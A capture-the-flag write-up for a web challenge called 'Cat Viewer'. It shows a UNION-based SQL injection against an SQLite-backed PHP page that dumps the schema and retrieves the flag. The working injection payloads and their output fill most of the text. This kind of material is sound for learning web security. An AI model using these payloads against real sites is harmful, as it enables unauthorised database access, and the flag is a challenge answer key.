# Cat Viewer

## Category
Web

## Description
I built a little web site to search through my archive of cat photos. I hid a little something extra in the database too. See if you can find it!

https://nessus-catviewer.chals.io/

## Solution

Website redirects to `https://nessus-catviewer.chals.io/index.php?cat=Shelton` page containing:
```
Searching for cats with names like Shelton

Name: Shelton Gay

<image of cat with base64 as img src>
```

Trying to open `https://nessus-catviewer.chals.io/index.php?cat=%22` returns following errors:

```
Searching for cats with names like "


Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: """ in /var/www/html/index.php on line 19

Fatal error: Uncaught Error: Call to a member function numColumns() on bool in /var/www/html/index.php:21 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 21
```

Website is susceptible for SQL Injections (Union Attacks):

`https://nessus-catviewer.chals.io/index.php?cat=%22%20UNION%20SELECT%20NULL,NULL,NULL,NULL--` returns

```
Searching for cats with names like " UNION SELECT NULL,NULL,NULL,NULL--

Name: 

<img src="data:image/gif;base64,">

<continuation of cat images>
```

Reading the schema database using
`" UNION ALL SELECT name,name,name,name FROM sqlite_schema;--`

```
Name: cats

Name: sqlite_sequence
```

and using `" UNION ALL SELECT sql,sql,sql,sql FROM sqlite_schema;--`

```
Name: CREATE TABLE cats ( id INTEGER PRIMARY KEY AUTOINCREMENT, image TEXT NOT NULL, name TEXT NOT NULL, flag TEXT NOT NULL )

Name: CREATE TABLE sqlite_sequence(name,seq)
```

Using another UNION attack to get content of cat.flag column
`" UNION ALL SELECT flag,flag,flag,flag FROM cats;--`

```
Name: flag{a_sea_of_cats}
```